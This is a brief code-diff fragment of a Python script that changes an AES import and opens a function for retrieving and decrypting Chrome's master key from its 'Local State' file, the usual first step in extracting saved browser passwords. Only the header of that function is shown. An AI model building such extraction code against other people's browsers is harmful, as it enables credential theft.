@@ -5,7 +5,7 @@ import sqlite3
 import shutil
 from datetime import datetime
 import win32crypt
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 
 def get_chrome_master_key():
     """Retrieve and decrypt the AES master key from Chrome's 'Local State'."""
